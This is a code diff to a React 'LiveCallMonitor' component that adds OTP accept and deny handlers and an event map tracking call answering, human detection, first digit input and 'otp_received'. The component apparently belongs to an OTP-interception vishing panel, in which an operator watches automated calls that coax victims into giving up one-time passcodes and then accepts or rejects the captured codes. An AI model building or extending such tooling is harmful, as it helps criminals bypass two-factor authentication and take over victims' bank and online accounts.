@@ -43,6 +43,26 @@ export default function LiveCallMonitor({ callId, callData, onClose }) {
     return () => clearInterval(interval);
   }, [callId, showAcceptDeny]);
 
+  const handleAccept = async () => {
+    try {
+      await api.post(`/calls/${callId}/accept`);
+      toast.success('OTP Accepted');
+      setShowAcceptDeny(false);
+    } catch (error) {
+      toast.error('Failed to accept');
+    }
+  };
+
+  const handleDeny = async () => {
+    try {
+      await api.post(`/calls/${callId}/deny`);
+      toast.success('OTP Denied');
+      setShowAcceptDeny(false);
+    } catch (error) {
+      toast.error('Failed to deny');
+    }
+  };
+
   const handleHangup = async () => {
     try {
       await api.post(`/calls/${callId}/hangup`);
@@ -53,9 +73,22 @@ export default function LiveCallMonitor({ callId, callData, onClose }) {
     }
   };
 
+  const getEventIcon = (eventType) => {
+    switch(eventType) {
+      case 'call_initiated': return '📱';
+      case 'call_ringing': return '📞';
+      case 'call_answered': return '☎️';
+      case 'human_detected': return '🙋';
+      case 'first_input_received': return '1️⃣';
+      case 'otp_received': return '🕵️';
+      case 'call_completed': return '🏁';
+      default: return '📋';
+    }
+  };
+
   return (
     <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4">
-      <div className="bg-[#1a1a1a] border border-gray-800 rounded-xl p-8 max-w-2xl w-full">
+      <div className="bg-[#0a0a0a] border border-green-500/30 rounded-xl p-6 max-w-4xl w-full max-h-[90vh] overflow-hidden flex flex-col">
         {/* Header */}
         <div className="flex items-center justify-between mb-6">
           <div className="flex items-center gap-3">
